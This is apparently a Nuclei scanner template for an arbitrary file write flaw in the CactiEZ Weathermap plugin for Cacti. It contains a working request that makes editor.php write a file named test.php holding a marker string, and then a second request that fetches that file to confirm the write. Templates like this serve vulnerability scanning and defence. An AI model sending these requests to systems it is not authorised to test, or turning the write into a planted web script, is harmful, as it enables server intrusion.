id: Cacti-Weathermap-FileWrite
info:
  name: CactiEZ Weathermap Plugin Arbitrary File Write Vulnerability
  author:
  - l0ne1y
  description: |-
    CactiEZ Weathermap plugin arbitrary file write vulnerability
    Cacti is a set of network traffic monitoring and graphical analysis tools developed with PHP, MySQL, SNMP, and RRDTool. Weathermap is one of the most useful plugins for Cacti, which can be used to draw network topology maps.

    The CactiEZ Weathermap plugin has an arbitrary file write vulnerability. An attacker can exploit this vulnerability to write malicious script files and thereby obtain sensitive information.
  severity: high
  remediation: |-
    **Official fix**
    Please follow the vendor homepage for the latest version updates:
    http://cactiez.cactiusers.org/
requests:
- matchers:
  - type: dsl
    condition: and
    dsl:
    - status_code_1==200 && status_code_2==200
    - contains(body_2,"46ea1712d4b13b55b3f680cc5b8b54e8")
  matchers-condition: and
  path:
  - '{{BaseURL}}/plugins/weathermap/editor.php?plug=0&mapname=test.php&action=set_map_properties&param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_name=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&link_bandwidth_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link_hover=&map_title=46ea1712d4b13b55b3f680cc5b8b54e8&map_legend=Traffic+Load&map_stamp=Created%3A%2B%25b%2B%25d%2B%25Y%2B%25H%3A%25M%3A%25S&map_linkdefaultwidth=7'
  - '{{BaseURL}}/plugins/weathermap/configs/test.php'
  method: GET
  req-condition: true
